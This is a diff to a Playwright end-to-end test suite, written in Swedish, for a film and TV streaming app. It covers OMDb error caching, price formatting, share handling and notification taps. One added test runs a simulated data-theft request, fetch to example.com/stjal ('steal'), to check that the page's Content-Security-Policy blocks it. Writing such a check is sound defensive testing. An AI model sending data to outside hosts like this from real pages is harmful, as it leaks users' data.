@@ -114,7 +114,12 @@ def sa(route):
     else: body={}
     route.fulfill(status=200, body=json.dumps(body), content_type="application/json", headers={"access-control-allow-origin":"*"})
 
+omdb_calls = []
 def omdb(route):
+    omdb_calls.append(route.request.url)
+    if "i=ttmissing" in route.request.url:   # OMDb känner inte till titeln (vanligt för helt nya titlar)
+        return route.fulfill(status=200, body=json.dumps({"Response":"False","Error":"Movie not found!"}),
+                             content_type="application/json", headers={"access-control-allow-origin":"*"})
     route.fulfill(status=200, body=json.dumps({"Response":"True","imdbRating":"7.9","Metascore":"81","Ratings":[{"Source":"Rotten Tomatoes","Value":"92%"}]}),
                   content_type="application/json", headers={"access-control-allow-origin":"*"})
 
@@ -537,6 +542,7 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     check(pg.locator("#personResults .item").count() >= 2, "man kan byta till rollerna som skådespelare")
 
     # Följ en person: det som redan finns räknas som känt, nytt ger en notis i bevakningen.
+    check(pg.evaluate("$('followBtn').tagName") == "BUTTON", "Följ är en riktig knapp")
     pg.click("#followBtn"); pg.wait_for_timeout(1200)
     f = pg.evaluate("follows[55]")
     check(f and f["init"] and not f["off"] and "movie/732" in f["known"] and "movie/730" in f["known"] and "tv/731" not in f["known"]
@@ -592,10 +598,10 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     check("Ingår i ditt abonnemang på Netflix" in pg.locator("#price").inner_text(), "pris: titel på din tjänst ingår – " + pg.locator("#price").inner_text())
     pg.evaluate("closeSheets()")
     pg.evaluate("""() => openDetail('x', { show:{ showType:'movie', tmdbId:'movie/741', title:'Hyrfilm', imageSet:{},
-        streamingOptions:{ se:[{ service:{ id:'prime', name:'Prime Video' }, type:'rent', price:{ formatted:'49 SEK' } }] } }, added:{}, links:{}, approx:{}, search:true })""")
+        streamingOptions:{ se:[{ service:{ id:'prime', name:'Prime Video' }, type:'rent', price:{ amount:'49', currency:'SEK', formatted:'49 SEK' } }] } }, added:{}, links:{}, approx:{}, search:true })""")
     pg.wait_for_timeout(400)
-    pr = pg.locator("#price").inner_text()
-    check("Kostar extra" in pr and "hyr 49 SEK" in pr and "SF Anytime (hyr)" in pr and pr.count("Prime Video") + pr.count("Amazon Video") == 1
+    pr = pg.locator("#price").inner_text().replace("\u00a0", " ")
+    check("Kostar extra" in pr and "hyr 49 kr" in pr and "SEK" not in pr and "SF Anytime (hyr)" in pr and pr.count("Prime Video") + pr.count("Amazon Video") == 1
           and "abonnemang du inte har: C More" in pr, "pris: hyra/köpa med pris, en rad per butik – " + pr)
     pg.evaluate("closeSheets()")
     pg.evaluate("openDetail('x', { show:{ showType:'movie', tmdbId:'movie/743', title:'Gratisfilm', imageSet:{} }, added:{}, links:{}, approx:{}, search:true })")
@@ -607,6 +613,17 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     pg.wait_for_timeout(400)
     pr = pg.locator("#price").inner_text()
     check("Ingår i ditt abonnemang på Netflix" in pr and "Ingen tjänst" not in pr, "pris: säger inte emot Finns på när TMDB saknar data – " + pr)
+    check(pg.evaluate("fmtPrice({ formatted:'4,99 €' })") == "4,99 €" and pg.evaluate("fmtPrice({ amount:'39.5', currency:'SEK' })").replace("\u00a0", " ") == "39,50 kr",
+          "pris: belopp visas i kronor, annars som tjänsten skriver det")
+
+    # OMDb: ett fel (titeln saknas) sparas ett dygn, så att detaljvyn inte frågar igen varje gång.
+    n0 = len(omdb_calls)
+    om = pg.evaluate("""async () => { const r = []; for (let i = 0; i < 2; i++){ try{ await ratingsFor('ttmissing'); r.push('ok'); }catch(e){ r.push(e.message); } } return r; }""")
+    check(om == ["Movie not found!", "Movie not found!"] and len(omdb_calls) - n0 == 1, f"OMDb: fel sparas och frågas inte om ({om}, {len(omdb_calls) - n0} anrop)")
+
+    # Säkerhet: sidan får inte skicka data till andra adresser än appens tjänster (Content-Security-Policy).
+    csp = pg.evaluate("""async () => { try{ await fetch('https://example.com/stjal?k=1'); return 'skickades'; }catch(e){ return 'stoppad'; } }""")
+    check(csp == "stoppad" and pg.locator("meta[http-equiv='Content-Security-Policy']").count() == 1, f"CSP stoppar anrop till okända adresser ({csp})")
     pg.evaluate("closeSheets()")
     pg.evaluate("closeSheets()")
 
@@ -670,9 +687,19 @@ with sync_playwright() if False else __import__("playwright.sync_api", fromlist=
     check(tv.evaluate("TvBridge.takeShared()") == "", "dela: samma delning lämnas bara ut en gång")
     tv.evaluate("closeSheets(); handleShared({ text:'Watch “Slow Horses” on Netflix https://www.netflix.com/title/1' })"); tv.wait_for_timeout(1200)
     check(tv.evaluate("$('detail').classList.contains('open') && $('detail').dataset.cur") == "tv/901", "dela: en säker titelträff öppnas direkt")
+    n0 = calls.count("/search/multi")
     tv.evaluate("closeSheets(); handleShared({ text:'Kolla in Fallout!' })"); tv.wait_for_timeout(1500)
     check(not tv.evaluate("$('detail').classList.contains('open')") and tv.evaluate("$('q').value") == "Fallout"
           and tv.locator("#searchResults .item").count() >= 2, "dela: osäker träff visar sökträffarna att välja bland")
+    check(calls.count("/search/multi") - n0 == 1, f"dela: sökträffarna återanvänds ({calls.count('/search/multi') - n0} sökningar)")
+    # En andra delning medan den första letas upp tappas inte: den senaste visas när den första är klar.
+    tv.evaluate("""() => { closeSheets(); showTab('new'); handleShared({ text:'https://www.imdb.com/title/tt5875444/' });
+        handleShared({ text:'https://www.themoviedb.org/tv/901' }); }""")
+    tv.wait_for_timeout(2000)
+    check(tv.evaluate("$('detail').classList.contains('open') && $('detail').dataset.cur") == "tv/901", "dela: en delning under pågående uppslag köas")
+    # Tryck på en bevakningsnotis i Android-appen öppnar titeln.
+    tv.evaluate("closeSheets(); handleShared({ text:'https://www.themoviedb.org/movie/777', subject:'', src:'notif' })"); tv.wait_for_timeout(1200)
+    check(tv.evaluate("$('detail').classList.contains('open') && $('detail').dataset.cur") == "movie/777", "notis: tryck öppnar titeln i detaljvyn")
     # Öppnas appen via Dela hämtas delningen när sidan laddats.
     sh = ctx.new_page(); sh.on("pageerror", lambda e: errs.append("JS: "+str(e)))
     sh.add_init_script("""window.TvBridge = { getTv:() => "{}", setWatch:() => {}, checkWatchNow:() => {}, notifEnabled:() => true,
